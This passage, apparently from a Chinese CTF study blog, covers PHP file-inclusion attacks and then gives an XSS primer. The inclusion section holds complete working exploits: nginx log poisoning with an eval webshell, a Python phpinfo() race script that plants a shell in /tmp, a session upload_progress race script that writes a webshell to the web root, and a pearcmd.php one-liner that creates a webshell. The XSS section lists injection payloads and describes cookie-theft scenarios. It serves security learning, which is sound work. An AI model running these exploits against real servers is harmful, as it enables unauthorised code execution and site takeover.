<h4 id="后缀可控"><a href="#后缀可控" class="headerlink" title="后缀可控"></a>后缀可控</h4><p>可以考虑路径跳转，参考file协议</p>
<p>直接疯狂../../../../之前是提到过Linux对于../能自己计算</p>
<h3 id="nginx日志包含"><a href="#nginx日志包含" class="headerlink" title="nginx日志包含"></a>nginx日志包含</h3><p>nginx 的默认路径 <code>/var/log/nginx/access.log</code></p>
<p>这里我们要使用user-agent，将恶意代码写到里边，如果是其他方式包含，代码将会被编码导致无法执行</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209091927344.png" alt="image-20220909192728299"></p>
<p>然后再读取<code>/var/log/nginx/access.log</code>执行日志里的恶意代码</p>
<p>常见出错地方</p>
<ul>
<li>包含的文件路径错误<code>/var/log/nginx/access.log</code></li>
<li>写入的UA语法错误<code>&lt;?php eval($_POST[1]); ?&gt;</code></li>
<li>转义错误<code>file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval($_POST[1]);?&gt;&quot;);</code></li>
</ul>
<p>当php语法中在双引号中的符号需要转义，否则判断为空</p>
<p>即</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span> = <span class="meta">&lt;?php</span> <span class="keyword">eval</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这时候我们可以把$符号进行\转义</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>符号没有进行转义，无法正常执行</p>
<p>如果发生语法错误，污染了题目环境，只能重开容器</p>
<h3 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h3><p>phpinfo(); 竞争上传，这里有个python2的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>(<span class="params">host, port</span>):</span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;&quot;%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s&quot;&quot;&quot;</span> %(<span class="built_in">len</span>(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, e, l, m, *args</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class="line">                    self.event.<span class="built_in">set</span>()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">&quot;0\r\n\r\n&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Woot!  \m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.<span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="session文件包含（upload-progress文件上传）"><a href="#session文件包含（upload-progress文件上传）" class="headerlink" title="session文件包含（upload_progress文件上传）"></a>session文件包含（upload_progress文件上传）</h3><p>有包含点，且<code>PHP_SESSION_UPLOAD_PROGRESS</code>不变时，可以使用此脚本</p>
<p><code>session_upload_progress</code>最初是php为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在session中，此时即使用户没有初始化session，php也会自动初始化session。而且，默认情况下<code>session.uoload_progress.enabled</code>是为<code>on</code>的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化session。</p>
<p>从上面可以看到，session中一部分数据<code>（session.uoload_progress.enabled）</code>是用户自己控制的。那么我们只要在文件上传的时候，同时post一个恶意字段<code>PHP_SESSION_UPLOAD_PROGRESS</code>，目标服务器的PHP就会自动启用session，session文件将会自动创建。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">url=<span class="string">&quot;http://6eb9a422-f96b-4a44-a67d-0d9f9d3e716f.challenges.ctfer.com:8080/&quot;</span> <span class="comment">#靶场地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data1=&#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php echo &quot;success&quot;;file_put_contents(&quot;/var/www/html/1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">        <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                r = session.post(url,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                r = session.get(url+<span class="string">&quot;?file=../../../../../../../tmp/sess_ctfshow&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;shell 地址为：&quot;</span>+url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line">                        exit()</span><br><span class="line">                        </span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="pear文件包含"><a href="#pear文件包含" class="headerlink" title="pear文件包含"></a>pear文件包含</h3><p>pear模块下有很多php文件，可以利用其中的某个php，分析发现<code>/usr/local/lib/php/PEAR/Command/Install.php</code>存在可利用点</p>
<p><code>/usr/local/lib/php/pearcmd.php</code>存在可利用点</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092146690.png" alt="image-20220909214644657"></p>
<p>argv注册功能开启了就可以使用这种姿势</p>
<p>可以通过配置文件写入一句话木马</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+1.php</span><br></pre></td></tr></table></figure>

<p>其中aaa可以将数据弹出argv，三个➕，四个元素</p>
<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>这里是结合了上边的日志包含，或者可以理解成远程日志包含</p>
<p>这里由于题目过滤了符号. 所以我们可以用<a href="http://www.ab173.com/net/ip2int.php">http://www.ab173.com/net/ip2int.php</a> 将IP转换成纯数字</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092204124.png" alt="image-20220909220415037"></p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Study</tag>
        <tag>PHP_include</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_XSS</title>
    <url>/2022/05/04/web_XSS/</url>
    <content><![CDATA[<p>在这之前先搞清楚xss的原理</p>
<h3 id="XSS的原理和分类"><a href="#XSS的原理和分类" class="headerlink" title="XSS的原理和分类"></a>XSS的原理和分类</h3><p>xss呢就是在web页面插入一段恶意的script代码，用户浏览页面的的时候，嵌入web里的script代码就执行，然后就达到恶意攻击用户的目的。xss是针对用户层面的攻击。</p>
<p>xss有三类：存储型、反射型和DOM型；</p>
<p>存储型XSS：</p>
<p>存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie。</p>
<p><img src="https://img-blog.csdnimg.cn/9c61c961907f4c3abef0610d6cf2644b.png"></p>
<p>反射型XSS：</p>
<p>反射型XSS，非持久化，需要欺骗用户自己去点链接才能触发XSS代码（并没有存储在服务器中），一般容易出现在搜索页面。反射型XSS大多数用来盗取用户的Cookie。</p>
<p><img src="https://img-blog.csdnimg.cn/892ac6177ed64e8c979cb23f29993d5e.png"></p>
<p>DOM型XSS：</p>
<p>DOM型XSS，不经过后端，是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。 DOM的详解：<a href="https://blog.csdn.net/qq_36119192/article/details/82933873">DOM文档对象模型</a></p>
<p>可能触发DOM型XSS的属性：</p>
<blockquote>
<p>document.referer<br>window.name<br>location<br>innerHTML<br>documen.write</p>
</blockquote>
<p>如图，我们在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法赋值给选择列表，该过程没有经过后端，完全是在前端完成的。所以，我们就可以在我们输入的参数上做手脚了。</p>
<p><img src="https://img-blog.csdnimg.cn/68be657b44fe4c2ca6ebd50fd51ef380.png"></p>
<h3 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h3><p>以下所有标签的 &gt; 都可以用 // 代替， 例如 <code>&lt;script&gt;alert(welcome)&lt;/script//</code></p>
<h4 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h4><p>script标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，可以将代码插入脚本标记中</p>
<p><img src="https://s1.ax1x.com/2022/05/06/OuurdI.png"></p>
<h4 id="svg标签"><a href="#svg标签" class="headerlink" title="svg标签"></a>svg标签</h4><p><img src="https://s1.ax1x.com/2022/05/06/OuKe0A.png"></p>
<h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><p><img src="https://s1.ax1x.com/2022/05/06/OuKZmd.png"></p>
<h4 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h4><p><img src="https://s1.ax1x.com/2022/05/06/OuKEOH.png"></p>
<h4 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h4><p><img src="https://s1.ax1x.com/2022/05/06/OuKA6e.png"></p>
<h4 id="style标签"><a href="#style标签" class="headerlink" title="style标签"></a>style标签</h4><p><img src="https://s1.ax1x.com/2022/05/06/OuKklD.png"></p>
<h3 id="XSS可以插在哪里？"><a href="#XSS可以插在哪里？" class="headerlink" title="XSS可以插在哪里？"></a>XSS可以插在哪里？</h3><blockquote>
<p>·用户输入作为script标签内容</p>
<p>·用户输入作为HTML注释内容</p>
<p>·用户输入作为HTML标签的属性名</p>
<p>·用户输入作为HTML标签的属性值</p>
<p>·用户输入作为HTML标签的名字</p>
<p>·直接插入到CSS里</p>
<p>tips:最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="comment">&lt;!-- 用户输入 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- --&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!-- --&gt;</span></span><br><span class="line"></span><br><span class="line">#用户输入作为标签属性名，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> 用户输入=<span class="string">&quot;xx&quot;</span>&gt;</span>  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;xx&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#用户输入作为标签属性值，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;用户输入&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;x&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#用户输入作为标签名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;用户输入  id=&quot;xx&quot; /&gt;</span><br><span class="line"><span class="tag">&lt;&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">id</span>=<span class="string">&quot;xx&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">#用户输入作为CSS内容，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml">用户输入<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span> </span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span> <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XSS漏洞挖掘"><a href="#XSS漏洞挖掘" class="headerlink" title="XSS漏洞挖掘"></a>XSS漏洞挖掘</h3><h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><p>尽可能扎到一切用户可控并且能够输出在页面代码中的地方，比如：</p>
<blockquote>
<p>·url的每一个参数</p>
<p>·url本身</p>
<p>·表单</p>
<p>·搜索框</p>
</blockquote>
<p>常见业务场景</p>
<blockquote>
<p>·重灾区：评论区、留言区、个人信息、订单信息等。</p>
<p>·针对性：站内信、网页即时通讯、私信、意见反馈等。</p>
<p>·存在风险：搜索框、当前目录、图片属性等。</p>
</blockquote>
<h4 id="白盒测试（代码审计）"><a href="#白盒测试（代码审计）" class="headerlink" title="白盒测试（代码审计）"></a>白盒测试（代码审计）</h4><p>关于XSS的代码审计主要是从接手参数的地方和一些关键词入手。</p>
<p>PHP中常见的接收参数的方式有<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等，可以搜索所有接收参数的地方。然后对接收的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和HTML编码等处理。</p>
<p>也可以搜索类似<code>echo</code>这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取得，是否能控制存到数据库中的数据，存到数据库之前有无过滤等。</p>
<p>大多数程序会接收参数封装在公文文件的函数中统一调用，我们需要审计这些公共函数有没有过滤，能否绕过等。</p>
<h3 id="XSS攻击过程"><a href="#XSS攻击过程" class="headerlink" title="XSS攻击过程"></a>XSS攻击过程</h3><h4 id="反射型XSS漏洞："><a href="#反射型XSS漏洞：" class="headerlink" title="反射型XSS漏洞："></a>反射型XSS漏洞：</h4><blockquote>
<ol>
<li>Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点需要Alice使用用户名/密码进行登录，并存储了Alice敏感信息(比如银行帐户信息)。</li>
<li>Tom 发现 Bob的站点存在反射性的XSS漏洞</li>
<li>Tom 利用Bob网站的反射型XSS漏洞编写了一个exp，做成链接的形式，并利用各种手段诱使Alice点击</li>
<li>Alice在登录到Bob的站点后，浏览了 Tom 提供的恶意链接</li>
<li>嵌入到恶意链接中的恶意脚本在Alice的浏览器中执行。此脚本盗窃敏感信息(cookie、帐号信息等信息)。然后在Alice完全不知情的情况下将这些信息发送给 Tom。</li>
<li>Tom 利用获取到的cookie就可以以Alice的身份登录Bob的站点，如果脚本的功更强大的话，Tom 还可以对Alice的浏览器做控制并进一步利用漏洞控制</li>
</ol>
</blockquote>
<h4 id="存储型XSS漏洞："><a href="#存储型XSS漏洞：" class="headerlink" title="存储型XSS漏洞："></a>存储型XSS漏洞：</h4><blockquote>
<ol>
<li>Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。</li>
<li>Tom检测到Bob的站点存在存储型的XSS漏洞。</li>
<li>Tom在Bob的网站上发布一个带有恶意脚本的热点信息，该热点信息存储在了Bob的服务器的数据库中，然后吸引其它用户来阅读该热点信息。</li>
<li>Bob或者是任何的其他人如Alice浏览该信息之后,Tom的恶意脚本就会执行。</li>
<li>Tom的恶意脚本执行后，Tom就可以对浏览器该页面的用户发动一起XSS攻击</li>
</ol>
</blockquote>
<h3 id="XSS漏洞的危害"><a href="#XSS漏洞的危害" class="headerlink" title="XSS漏洞的危害"></a>XSS漏洞的危害</h3><p><img src="https://img-blog.csdnimg.cn/3ba175ddcd134cf2a436c17602841e2f.png"></p>
